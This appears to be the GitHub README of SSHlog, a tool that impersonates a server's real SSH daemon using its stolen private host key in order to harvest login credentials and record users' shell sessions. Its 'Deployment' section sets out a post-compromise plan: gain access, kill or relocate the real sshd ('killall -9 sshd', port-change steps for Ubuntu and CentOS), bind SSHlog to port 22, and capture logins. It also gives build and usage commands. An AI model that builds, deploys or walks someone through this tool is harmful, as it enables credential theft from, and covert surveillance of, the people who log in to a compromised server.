# SSHlog
SSHlog is a tool to capture SSH credentials and log client commands. It uses the private key of a valid SSH daemon to appear legitimate. It is not a high interaction honeypot. If a client uses valid credentials SSHlog can spawn a real shell and record the input and output of client commands. SSHlog-mini is a simplified version of SSHlog that only captures SSH credentials.

![example](example.png)

## Build
```bash
git clone https://github.com/Zilog-Z80/SSHlog.git
cd SSHlog
go build SSHlog.go
# Alternatively, statically link c libraries with:
# go build -ldflags "-linkmode 'external' -extldflags '-static'" SSHlog.go
./SSHlog
```

## Usage
```bash
./SSHlog # Run with default settings
./SSHlog -h # display usage

Usage of ./SSHlog:
  -k string
    	server private key (default "/etc/ssh/ssh_host_ed25519_key")
  -l	allow clients to login and spawn a shell (default FALSE)
  -m string
    	send message to client on exit (default NONE)
  -p int
    	port (default 22)
  -s	silent mode (default FALSE)
  -v	log to stdout NOT RECOMMENDED (default FALSE)
```

## Deployment
1. Gain access to a server
2. Change the valid SSH daemon's port or kill the daemon
3. Bind SSHlog to port 22 and use the valid daemon's private key
4. Capture login credentials

## Kill sshd
```bash
killall -9 sshd
# pkill -9 sshd
# kill -9 $(pidof sshd)
```

## Change sshd port
Ubuntu 20:  
```bash
nano /etc/ssh/sshd_config
# Uncomment the '#Port 22' line and change to desired port
systemctl restart ssh  
# service ssh restart
```

Ubuntu 22:
```bash
mkdir -p /etc/systemd/system/ssh.socket.d

cat >/etc/systemd/system/ssh.socket.d/listen.conf <<EOF
[Socket]
ListenStream=
ListenStream=1234
EOF

systemctl daemon-reload
systemctl restart ssh
```

CentOS:
```bash
vi /etc/ssh/sshd_config
# Uncomment the '#Port 22' line and change to desired port
yum install policycoreutils
semanage port -a -t ssh_port_t -p tcp <port>
semanage port -m -t ssh_port_t -p tcp <port>
systemctl restart sshd
sudo firewall-cmd --add-port=<port>/tcp --permanent
```
